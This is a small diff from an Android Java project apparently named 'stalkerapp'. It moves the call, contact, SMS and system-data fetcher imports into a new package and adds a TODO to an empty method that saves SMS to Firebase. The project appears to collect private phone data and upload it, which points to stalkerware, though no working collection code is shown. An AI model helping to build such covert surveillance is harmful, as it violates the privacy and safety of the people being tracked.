@@ -11,10 +11,10 @@ import com.github.saintedlittle.stalkerapp.data.CallData;
 import com.github.saintedlittle.stalkerapp.data.ContactData;
 import com.github.saintedlittle.stalkerapp.data.SMSData;
 import com.github.saintedlittle.stalkerapp.data.SystemData;
-import com.github.saintedlittle.stalkerapp.utils.CallFetcher;
-import com.github.saintedlittle.stalkerapp.utils.ContactFetcher;
-import com.github.saintedlittle.stalkerapp.utils.SMSFetcher;
-import com.github.saintedlittle.stalkerapp.utils.SystemDataFetcher;
+import com.github.saintedlittle.stalkerapp.fetcher.CallFetcher;
+import com.github.saintedlittle.stalkerapp.fetcher.ContactFetcher;
+import com.github.saintedlittle.stalkerapp.fetcher.SMSFetcher;
+import com.github.saintedlittle.stalkerapp.fetcher.SystemDataFetcher;
 import com.google.firebase.firestore.DocumentReference;
 import com.google.firebase.firestore.FirebaseFirestore;
 
@@ -131,7 +131,7 @@ public class FirebaseSaver {
     }
 
     public void pushNewSMS(SMSData data) {
-
+        // TODO:
     }
 
     private static final class FirebaseConstants {
